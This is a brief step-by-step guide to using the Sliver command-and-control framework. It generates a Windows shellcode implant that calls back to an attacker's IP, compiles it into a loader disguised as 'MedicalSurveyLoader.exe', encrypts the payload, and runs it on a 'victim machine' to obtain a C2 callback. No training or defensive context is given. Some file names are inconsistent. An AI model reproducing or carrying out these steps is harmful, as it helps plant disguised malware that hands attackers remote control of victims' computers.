Process To Execute this 
First Install Sliver in your kali machine

# Start the Sliver server (as root)
sliver-server

# In a new terminal window, connect to the server as the client
sliver-client

# Now, within the Sliver client console:
# 1. Create a new HTTP listener on your attacker IP
In sliver client we use run the command “http”

# 2. Generate a Windows staged shellcode payload (raw format)
generate --http http://[ Your attacker machine IP]:80 --os windows --arch amd64 --format shellcode --save /root/payload.bin

Now move this "payload.in bin file in the folder where you have loader.cpp and encrypt.py

# Compile the loader.cpp into Windows executable
x86_64-w64-mingw32-g++ -static -o MedicalSurveyLoader.exe stealth_loader.cpp -lws2_32 -Wl,--subsystem,windows

# Run the encrypt.py
python3 encrypt.py

After Doing all this you will have 4 files with you now to recieve the c2 call back transer the  MedicalSurveyLoader.exe stealth_loader.cpp along with encrypted_payload.bin to the victim machine run it and you will get the c2 call back
